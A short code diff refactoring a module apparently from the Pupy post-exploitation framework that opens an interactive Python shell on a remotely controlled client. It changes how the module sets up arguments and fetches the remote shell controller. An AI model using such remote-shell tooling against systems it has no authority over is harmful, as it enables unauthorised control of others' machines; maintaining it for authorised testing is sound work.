@@ -22,23 +22,32 @@ def enqueue_output(out, queue):
 @config(cat="admin")
 class InteractivePythonShell(PupyModule):
     """ open an interactive python shell on the remote client """
-    max_clients=1
-    dependencies=['pyshell']
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='pyshell', description=self.__doc__)
+
+    io = REQUIRE_REPL
+    dependencies = ['pyshell']
+
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='pyshell', description=cls.__doc__)
+
     def run(self, args):
+        PyShellController = self.client.remote('pyshell.controller', 'PyShellController', False)
+
         try:
             with redirected_stdo(self):
                 old_completer=readline.get_completer()
                 try:
-                    psc=self.client.conn.modules['pyshell.controller'].PyShellController()
+                    psc = PyShellController()
                     readline.set_completer(psc.get_completer())
                     readline.parse_and_bind('tab: complete')
+
                     while True:
                         cmd=raw_input(">>> ")
                         psc.write(cmd)
+
                 finally:
                     readline.set_completer(old_completer)
                     readline.parse_and_bind('tab: complete')
+
         except KeyboardInterrupt:
             pass
